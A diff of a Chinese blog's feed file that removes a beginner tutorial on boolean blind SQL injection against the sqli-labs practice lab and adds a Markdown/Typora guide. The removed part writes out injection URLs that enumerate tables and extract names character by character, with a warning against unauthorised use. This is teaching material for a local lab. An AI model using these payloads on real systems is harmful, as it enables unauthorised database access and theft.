-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/20/62b0461ad5085.png" data-fancybox="one" data-caption="2-5"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/20/62b0461ad5085.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/20/62b0461ad5085.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="2-5"></a><span class="image-caption">2-5</span></div></div>
-<p>使用PHPstudy的话，用户名密码默认都是root，都修改为root即可。要是不喜欢的话可以打开PHPstudy面板点击数据库，按照相应提示修改密码就可以了。<strong>但一定要确保MySQL数据库的用户名密码和该配置中一致！！！</strong></p>
-<p>接下来在浏览器中输入<code>localhost/sqli/</code>，这里<code>sqli</code>要换成你在Github上下载的那个文件夹解压后改的名字。（可以补充一下，这里搭建的网站其实就是www根目录下的所有文件和目录的集合。在后面加一个sqli/其实就是进入了sqli这个文件夹，然后进这个文件夹默认显示的就是这个文件夹里面的index.html或者index.php）</p>
-<p>言归正传，打开后显示如图：</p>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/13/62a757f5a169c.png" data-fancybox="one" data-caption="2-6"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/13/62a757f5a169c.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/13/62a757f5a169c.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="2-6"></a><span class="image-caption">2-6</span></div></div>
-<p>点击<code>setup/reset Database for labs</code>进行sqli-labs的初始化，初始化成功的页面如图：</p>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/12/62a53dec406ec.png" data-fancybox="one" data-caption="2-7"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/12/62a53dec406ec.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/12/62a53dec406ec.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="2-7"></a><span class="image-caption">2-7</span></div></div>
-<p>如果看到这个页面，congratulations！sqli-labs靶场环境已经搭建成功了。接下来只要点击page1/2/3/4就可以去完成挑战了！</p>
-</div><div class="story post-story"><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>还是要强调，不要在不被授权的网站上练习MySQL。<br>下一期（很快555）我们学习基于报错的的注入，也就是less1-less6。</p>
-
-</div>]]></content>
-      <categories>
-        <category>安全</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>Web安全</tag>
       </tags>
   </entry>
   <entry>
@@ -1179,75 +983,123 @@
       </tags>
   </entry>
   <entry>
-    <title>SQL注入新手教程（三）——布尔盲注</title>
-    <url>/posts/sqli3/</url>
-    <content><![CDATA[<p>在<a href="../../posts/sqli2/">上一期教程</a>中我们学习了基于报错的注入，或者准确地说是GET型基于报错的注入。相信大家也看出来了，这种注入是非常简单的，意味着这种漏洞是非常低级的。我们所见到的大多数网站中都不会出现如此低级的SQL注入漏洞。更多时候页面是不会回显报错语句的，这时候事情就变复杂了。我们无法直接看到报错语句，就需要通过估计不同的查询结果是TRUE还是FALSE来判断某个数据库是否能够注入，这就是盲注！</p>
-<div class="story post-story"><h2 id="布尔盲注原理"><a href="#布尔盲注原理" class="headerlink" title="布尔盲注原理"></a>布尔盲注原理</h2><p>之所以叫盲注，是因为我们在注入的过程中不会看到后端的错误返回语句。此时，如果我们执行的语句返回值为1，页面的显示是一种模样，如果为0，那么页面的显示是另一种模样。利用这样的特性，我们可以在SQL语句中加入逻辑表达式、关系表达式，不断试错，从而理论上能够解得我们所需要的数据，这和猜解密码有点相似。</p>
-</div><div class="story post-story"><h2 id="判断数据库是否能被布尔盲注"><a href="#判断数据库是否能被布尔盲注" class="headerlink" title="判断数据库是否能被布尔盲注"></a>判断数据库是否能被布尔盲注</h2><p>依然，我们首先打开PHPstudy面板，启动WAMP。<br>在浏览器地址栏输入<a href="http://localhost/sqli/Less-8/?id=1">http://localhost/sqli/Less-8/?id=1</a>进入Lesson8（按照你的端口号、目录名等修改）。<br>猜测对应的后端SQL语句为：</p>
-<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>
+    <title>Markdown进阶教程（以Typora为例）</title>
+    <url>/posts/mdlearn2/</url>
+    <content><![CDATA[<p><a id="1">此篇博客是进阶教程</a><br>建议零基础小白先食用：<a href="https://bowenyoung.cn/posts/mdLearn/">基础教程</a></p>
+<span id="more"></span>
 
-<p>此时页面显示如下：</p>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/21/62b1bc0d87e23.png" data-fancybox="default" data-caption="有提示文字"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/21/62b1bc0d87e23.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/21/62b1bc0d87e23.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="有提示文字"></a><span class="image-caption">有提示文字</span></div></div>
-
-<p>接着我们尝试破坏查询，在地址栏输入</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1'</span><br></pre></td></tr></tbody></table></figure>
-
-<p>猜测对应的后端SQL语句为：</p>
-<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span><span class="string">'</span></span><br></pre></td></tr></tbody></table></figure>
-
-<p>发现页面显示如下：</p>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/21/62b1bcef999c9.png" data-fancybox="default" data-caption="无提示文字"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/21/62b1bcef999c9.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/21/62b1bcef999c9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="无提示文字"></a><span class="image-caption">无提示文字</span></div></div>
-
-<p>观察上图我们可以发现，<code>You are in...</code>这段话不见了，说明这段查询语句是有问题的，即我们破坏查询成功了。但是页面没有回显报错信息，说明我们之前用的显注方法失效了。这时我们便要用到布尔盲注了。</p>
-<p>接着我们就继续判断我们传入的参数在后端是如何被封装的。<br>在地址栏输入</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost:81/sqli/Less-8/?id=1' and 1=1 --+</span><br></pre></td></tr></tbody></table></figure>
-
-<p>发现那段文字<code>You are in...</code>（后文称提示文字）又重新出现了，这证明：(i)参数是由单引号封装的；(ii)后端对1=1进行了判断并返回TRUE，可以进行布尔盲注。<br>因此推翻之前的SQL语句猜测，此处后端SQL语句形如：</p>
-<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> id<span class="operator">=</span><span class="string">'1'</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--+'</span></span><br></pre></td></tr></tbody></table></figure>
+<div class="story post-story"><h2 id="目录写法"><a href="#目录写法" class="headerlink" title="目录写法"></a>目录写法</h2><p>在任意位置添加<code>[TOC]</code>即可显示树状结构文章目录。显示效果可以参考本文目录：下图。</p>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/12/62a53bbd6d419.png" data-fancybox="one" data-caption="目录"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/12/62a53bbd6d419.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/12/62a53bbd6d419.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="目录"></a><span class="image-caption">目录</span></div></div>
 
 
 
-</div><div class="story post-story"><h2 id="布尔盲注思路"><a href="#布尔盲注思路" class="headerlink" title="布尔盲注思路"></a>布尔盲注思路</h2><p>确认能够进行布尔盲注后，我们需要想办法获取我们想要的数据。通常会编写脚本来自动进行布尔盲注，但本文重点在于厘清布尔盲注的原理和实现路线，因此采用手动注入的方法。</p>
-<p>首先，我们需要知道当前数据库有哪些表、各自的名称，并判断哪些表含有重要信息；接着，我们需要知道表里有哪些字段、各自的名称，并判断哪些字段含有重要信息；最后我们获取到相应字段对应的每一条记录。</p>
-<p>这个由大及小的思路与之前的盲注并无差别，唯一不同的是这次我们不会直接看到查询的结果，而需要通过逻辑表达式和关系表达式是否返回为TRUE来猜解我们想要得到的信息。在布尔盲注的过程中，由于表中数据的不确定性，如果我们想要通过枚举出查询结果所有可能的值，这个工作量是非常大的。因此，我的方法是先确定数据库中表的数量，再确定每一个表的名称。确定表名时，先得到查询结果的字符串长度区间，再确定字符串长度，先确定每一个字符的ASCII码区间，再确定每一个字符的确切ASCII码。如果你有点迷糊了，没有关系，请接着往下看。</p>
-</div><div class="story post-story"><h2 id="确定数据库中表的数量"><a href="#确定数据库中表的数量" class="headerlink" title="确定数据库中表的数量"></a>确定数据库中表的数量</h2><p>我采用的方法是：让后端判断第n个表的字符串长度是否大于0，如果提示文字出现，则证明数据库有第n个表，否则证明数据库中最多有n-1个表。</p>
-<p>在地址栏输入</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (length((select table_name from information_schema.tables where table_schema=database() limit 3,1))) &gt; 0 --+</span><br></pre></td></tr></tbody></table></figure>
 
-<p>后端SQL语句形如：</p>
-<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> id<span class="operator">=</span><span class="string">'1'</span> <span class="keyword">and</span> (length((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">3</span>,<span class="number">1</span>))) <span class="operator">&gt;</span> <span class="number">0</span> <span class="comment">--+'</span></span><br></pre></td></tr></tbody></table></figure>
+</div><div class="story post-story"><h2 id="锚（跳转）"><a href="#锚（跳转）" class="headerlink" title="锚（跳转）"></a>锚（跳转）</h2><p>有两种方法：</p>
+<ol>
+<li><p>Markdown原生：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">跳转的终点（锚）：同html,见下</span><br><span class="line">跳转的起点（链接）：[显示的内容](#id)</span><br><span class="line">可以理解为跳转终点（锚）定义了一个名为id的元素，而跳转起点则是一个指向该元素的链接</span><br><span class="line">例如：文章第一句话的写法：&lt;a id="1"&gt;此篇博客是进阶教程&lt;/a&gt;，下面一行是跳转起点：[跳转至开头](#1)</span><br></pre></td></tr></tbody></table></figure>
 
-<p>这段语句的意思为：从数据库的表名中查询id=’1’的所有字段并且当前数据库中的第4个表名字符串长度大于0。其中length()函数作用是取查询结果的字符串长度，用法为length(字符串)。如果你忘了这句语句中其他地方的含义，请见<a href="../sqli2/">上一章</a>。<br>结果，页面显示了提示文字。表明当前数据库至少有4张表。<br>接着我们将地址栏中的字符改为</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (length((select table_name from information_schema.tables where table_schema=database() limit 4,1))) &gt; 0 --+</span><br></pre></td></tr></tbody></table></figure>
+<p><a href="#1">跳转至开头</a> ←点击此处查看效果<br><strong>注：id这里建议写英文或数字，不要写中文，可能会出错</strong></p>
+</li>
+<li><p>HTML写法：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">跳转终点：&lt;a id="xxx"&gt;显示的内容&lt;/a&gt;</span><br><span class="line">跳转起点：&lt;a href="#xxx"&gt;显示的内容&lt;/a&gt;</span><br><span class="line">除了a标签外，用p,div,span等标签也有效（将a改成p,div或span）</span><br><span class="line">例如：文章第一句话的写法：&lt;a id="1"&gt;此篇博客是进阶教程&lt;/a&gt;，下面一行是跳转起点：&lt;a href="#1"&gt;跳转至开头&lt;/a&gt;</span><br></pre></td></tr></tbody></table></figure>
 
-<p>作用是判断第5个表的字符串长度是否大于0，换言之，第5张表是否存在。<br>结果发现页面并没有显示提示文字。<br>由此，我们得到结论：当前数据库中有且仅有4张表。</p>
-</div><div class="story post-story"><h2 id="确定表名的字符串长度"><a href="#确定表名的字符串长度" class="headerlink" title="确定表名的字符串长度"></a>确定表名的字符串长度</h2><p>我们首先确定第一张表的字符串长度，用到的方法与上一小节类似。<br>在地址栏输入</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) &gt; 5 --+</span><br></pre></td></tr></tbody></table></figure>
+<p><a href="#1">跳转至开头</a>←点击此处查看效果<br><strong>注：若要跳转到零一页面的锚，在终点的<code>#xxx</code>之前添加文件名（如1.html）即可</strong></p>
+</li>
+</ol>
+</div><div class="story post-story"><h2 id="To-do-list（任务列表）"><a href="#To-do-list（任务列表）" class="headerlink" title="To-do list（任务列表）"></a>To-do list（任务列表）</h2><ul>
+<li>未完成：<code>- [ ] </code>		短横+空格+左方括号+空格+右方括号+空格</li>
+<li>已完成：<code>-[x] </code>		短横加空格+左方括号+字母x+右方括号+空格</li>
+</ul>
+<p><strong>注意-和[]中间一定要加空格、后面爷要加空格，未完成的写法[]中间有空格</strong></p>
+<p>举例：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">- [ ] 学习</span><br><span class="line">- [x] 打游戏</span><br><span class="line">- [x] 看电影</span><br></pre></td></tr></tbody></table></figure>
 
-<p>作用是判断第一张表表名的字符串长度是否大于5。<br>结果页面显示提示文字，证明第一张表表名的字符串长度大于5。<br>接着我们将5改成6，发现页面不显示提示文字了。答案也就出来了，第一张表表名的字符串长度为6。用同样的方法我们也可以获取其他表名的字符串长度。</p>
-</div><div class="story post-story"><h2 id="确定表名的每一个字符所对应的ASCII码值"><a href="#确定表名的每一个字符所对应的ASCII码值" class="headerlink" title="确定表名的每一个字符所对应的ASCII码值"></a>确定表名的每一个字符所对应的ASCII码值</h2><p>在确定了每张表表名的字符串长度之后，我们就需要确定其每一个字符的具体值。但是表名有可能是字母、数字、标点符号、操作符、特殊字符等，倘若我们一个个尝试，效率会很低。因此我们会想到用ASCII码值来判断字符的具体值。每一个ASCII码对应一个字符，主要对应关系如下图：</p>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/21/62b1cf9b79cc0.jpg" data-fancybox="default" data-caption="ASCII码对应表"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/21/62b1cf9b79cc0.jpg" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/21/62b1cf9b79cc0.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="ASCII码对应表"></a><span class="image-caption">ASCII码对应表</span></div></div>
+<p>效果：</p>
+<ul>
+<li><input disabled="" type="checkbox"> 学习</li>
+<li><input checked="" disabled="" type="checkbox"> 打游戏</li>
+<li><input checked="" disabled="" type="checkbox"> 看电影</li>
+</ul>
+</div><div class="story post-story"><h2 id="脚注"><a href="#脚注" class="headerlink" title="脚注"></a>脚注</h2><p><strong>由于本站源代码问题，脚注没有被很好地显示出来！</strong></p>
+<p>如果有参考文献或文章之类的话应该要用的<br>正文中脚注的编号用<code>[^1],[^2],[^3]</code>等，尾部注释对应用<code>[^1]: 注释内容</code>，<code>[^2]: 注释内容</code> ，<code>[^3]: 注释内容</code>等<br>脚注编号显示在文字右上角，鼠标移上去会显示注释内容</p>
+<p>举例：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">他[^1]</span><br><span class="line">文末处：[^1]: 黑框眼镜</span><br></pre></td></tr></tbody></table></figure>
 
-<p>我们这里以第四张表为例（问就是第四张表重要），在地址栏输入</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1))) &gt; 96 --+</span><br></pre></td></tr></tbody></table></figure>
+<p>正文效果：他<a href="%E9%BB%91%E6%A1%86%E7%9C%BC%E9%95%9C">^1</a>（注释在文末）</p>
+</div><div class="story post-story"><h2 id="Unicode特殊字符-emoji"><a href="#Unicode特殊字符-emoji" class="headerlink" title="Unicode特殊字符(emoji)"></a>Unicode特殊字符(emoji)</h2><p>格式为<code>&amp;#数字;</code>，其实是HTML<br>举例：<code>&amp;#937;</code>为Ω，<code>&amp;#952;</code>为θ。</p>
+<p>unicode字符包含的内容非常之多，最典型的还属emoji。如<code>&amp;#128517;</code>😅<code>&amp;#129299;</code>🤓</p>
+<p><a href="https://unicode-table.com/cn/">这里是unicode的参考网址</a></p>
+</div><div class="story post-story"><h2 id="支持HTML的典型例子"><a href="#支持HTML的典型例子" class="headerlink" title="支持HTML的典型例子"></a>支持HTML的典型例子</h2><h3 id="音频"><a href="#音频" class="headerlink" title="音频"></a>音频</h3><p>html5语法：</p>
+<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">"音频文件路径"</span>&gt;</span></span><br><span class="line">不能播放时的报错信息</span><br><span class="line"><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
 
-<p>其中，substr()函数作用为截取字符串中指定位置开始的指定个字符，用法为：substr(字符串,起始位置,截取长度)，起始位置从1开始。ascii()函数作用为取字符的ASCII码值，用法为ascii(字符)。因此上述语句作用为判断第4张表表名的第一个字符ASCII码值是否大于96。<br>结果发现页面显示提示文字，证明第4张表表名的第一个字符ASCII码值大于96，因此很大概率它是一个小写的英文字母。可以将<code>&gt; 96</code>改为<code>&lt; 123</code>尝试一下，发现的确如此。</p>
-<p>接着可以采用二分法来确定该字符的具体值。将<code>&lt; 123</code>改为<code>&gt; 110</code>发现页面显示提示文字，因此将111和122作为两个端点继续划分。将<code>&gt; 110</code>改为<code>&lt; 117</code>发现页面不显示提示文字。因此可以确定该字符为u,v,w,x,y,z中的一个，继续二分法或者枚举都可以得到：该字符为u。</p>
-<p>利用同样的方法，我们猜解得到第四张表的表名为<strong>users</strong>。同样地，我们也能够猜解出其他表名。</p>
-</div><div class="story post-story"><h2 id="确定表中字段数"><a href="#确定表中字段数" class="headerlink" title="确定表中字段数"></a>确定表中字段数</h2><p>与确定数据库中表数量的方法一致，只需将<code>table_name</code>替换为<code>column_name</code>，<code>information_schema.tables</code>替换为<code>information_schema.columns</code>，<code>table_schema=database()</code>替换为<code>table_name='users'</code>即可。如：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (length((select column_name from information_schema.columns where table_name='users' limit 3,1))) &gt; 0 --+</span><br></pre></td></tr></tbody></table></figure>
+<p>举例：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;audio src="audio.mp3"&gt;</span><br><span class="line">您的浏览器不支持播放该音频</span><br><span class="line">&lt;/audio&gt;</span><br></pre></td></tr></tbody></table></figure>
 
-<p>发现页面显示提示文字，证明users表中至少有4个字段。利用和上文一样的方法，最终可以知道users表中有6个字段。</p>
-</div><div class="story post-story"><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>确定字段的字符串长度，确定字段的每个字符具体值；确定记录数，确定记录的字符串长度，确定记录的每个字符具体值。方法与前文完全一致。有兴趣的小伙伴可以尝试一下继续手动猜解。</p>
-</div><div class="story post-story"><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>本文主要目的是为读者厘清布尔盲注的原理和思路，实际上，手动进行布尔盲注效率十分低下，几乎用不到。但如果时间充裕，可以感受一下手动进行布尔盲注的过程，私以为这有助于更清晰地认识布尔盲注。</p>
+
+
+<h3 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h3><p>同为html5语法：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;video src="视频文件路径"&gt;</span><br><span class="line">不能播放时的报错信息</span><br><span class="line">&lt;/video&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>举例：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;video src="video.mp4"&gt;</span><br><span class="line">您的浏览器不支持播放该音频</span><br><span class="line">&lt;/video&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="改变字体颜色和大小"><a href="#改变字体颜色和大小" class="headerlink" title="改变字体颜色和大小"></a>改变字体颜色和大小</h3><p>语法:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;font  color=#00ffff size=7 face="纯书法字体"&gt;青色7号纯书法字体&lt;/font&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;font color=cyan size=7 face="纯书法字体"&gt;或者可以这么写&lt;/font&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>显示效果:</p>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/12/62a53bbcebedc.png" data-fancybox="one" data-caption="undefined"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/12/62a53bbcebedc.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/12/62a53bbcebedc.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></a><span></span></div></div>
+
+
+
+
+</div><div class="story post-story"><h2 id="Markdown制图-2"><a href="#Markdown制图-2" class="headerlink" title="Markdown制图^2"></a>Markdown制图<a href="%E5%8F%82%E8%80%83%3Chttps://blog.csdn.net/adorable_/article/details/117780977">^2</a></h2><p>Markdown可以绘制很多图,如时序图、甘特图、mermaid流程图、flow流程图等。<br>这里主要介绍flow流程图。其他的图可以参考这篇CSDN博客：<a href="https://blog.csdn.net/qq_14920635/article/details/109033143?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164993699816780264064499%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=164993699816780264064499&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-109033143.142%5Ev8%5Epc_search_result_cache,157%5Ev4%5Econtrol&amp;utm_term=markdown%E7%BB%98%E5%9B%BE&amp;spm=1018.2226.3001.4187">点击跳转</a><br>首先，用一对3个`包裹代码块并在第一处后输入flow，确定这一段代码用flow来编写<br>然后就是绘制流程图的步骤。绘制流程图可以分为两步：</p>
+<ol>
+<li>定义元素（框框和里面的内容）：<br> <code>元素名称=&gt;元素类型: 显示的内容:&gt;超链接URL</code>(:&gt;URL可以不要)<br> <strong>注意：<code>=&gt;</code>后不能有空格， <code>:</code>后需要有空格</strong><br> 元素类型有6种，分别为：</li>
+</ol>
+<ul>
+<li><p>开始（椭圆形）：start</p>
+</li>
+<li><p>结束（椭圆形）：end</p>
+</li>
+<li><p>子程序（长得像圣旨诏书）：subroutine</p>
+</li>
+<li><p>操作（矩形）：operation</p>
+</li>
+<li><p>条件判断（菱形）：condition</p>
+</li>
+<li><p>输入输出（平行四边形）：inputoutput</p>
+</li>
+</ul>
+<ol start="2">
+<li>关联元素<br> 用 <code>-&gt;</code> 来关两个节点<br> 如果是 condition 节点将会有 yes/true 和 no/false 两个分支<br> left/right表示连线出口在节点位置（默认下面是出口，如con2），也可以跟condition变量一起用，如：con1(yes,right)</li>
+</ol>
+<p>举例：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">```flow</span><br><span class="line">start=&gt;start: 开始</span><br><span class="line">end=&gt;end: 结束</span><br><span class="line">in=&gt;inputoutput: 输入年份n</span><br><span class="line">con1=&gt;condition: n能否被4整除？</span><br><span class="line">con2=&gt;condition: n能被100整除？</span><br><span class="line">con3=&gt;condition: n能被400整除？</span><br><span class="line">out1=&gt;inputoutput: 输出闰年</span><br><span class="line">out2=&gt;inputoutput: 输出非闰年</span><br><span class="line"></span><br><span class="line">start(right)-&gt;in-&gt;con1(yes,right)-&gt;con2(yes)-&gt;con3(yes)-&gt;out1-&gt;end</span><br><span class="line">con1(no)-&gt;con2-&gt;end</span><br><span class="line">con2(no,right)-&gt;out1</span><br><span class="line">con3(no)-&gt;out2</span><br><span class="line">```</span><br></pre></td></tr></tbody></table></figure>
+
+<p>效果：</p>
+<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="one"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/12/62a53bbdd95cc.png" data-fancybox="one" data-caption="flow流程图"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/12/62a53bbdd95cc.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/12/62a53bbdd95cc.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="flow流程图"></a><span class="image-caption">flow流程图</span></div></div>
+
+
+
+
+
+</div><div class="story post-story"><h2 id="数学公式"><a href="#数学公式" class="headerlink" title="数学公式"></a>数学公式</h2><p>原生的Markdown是不支持LaTex的，但如果用Typora则支持LaTex预览<br>最后的显示效果取决于用什么软件编译和导出</p>
+</div><div class="story post-story"><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本博客名为教程，实则是个人学习Markdown的一些学习经验分享，不保证完全正确和详尽。欢迎指正错误，也欢迎留言分享哦！</p>
+<p>今日一言：</p>
+<blockquote>
+<p>我选择沉默的主要原因之一：从话语中，你很少能学到人性，从沉默中却能。假如还想学得更多，那就要继续一声不吭 。</p>
+<p>—— 王小波</p>
+</blockquote>
 
 </div>]]></content>
       <categories>
-        <category>安全</category>
+        <category>前端</category>
       </categories>
       <tags>
-        <tag>SQL注入</tag>
-        <tag>Web安全</tag>
+        <tag>Markdown</tag>
       </tags>
   </entry>
   <entry>
@@ -1313,6 +1165,42 @@
       <tags>
         <tag>SQL注入</tag>
         <tag>Web安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Shields.io使用之添加自定义图标</title>
+    <url>/posts/shield/</url>
+    <content><![CDATA[<div class="story post-story"><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p><a href="https://shields.io/">Shields.io</a>是一个为我们提供自定义徽章的文章。<span id="more"></span>在GitHub的很多仓库我们都能见到像<img no-lazy="" class="inline" src="/img/volantis.svg" style="height:1.5em">这样的徽章，它们绝大多数都使用<a href="https://shields.io/">Shields.io</a>制作。但是我们在使用logo时，由于其logo库使用<a href="https://simpleicons.org/">Simple Icons</a>，所以只有国际知名的品牌logo能在上面找到。那么，当我们想要使用自己定义的logo时，就不能仅凭<code>logo=xxx</code>这样简单的代码实现了。</p>
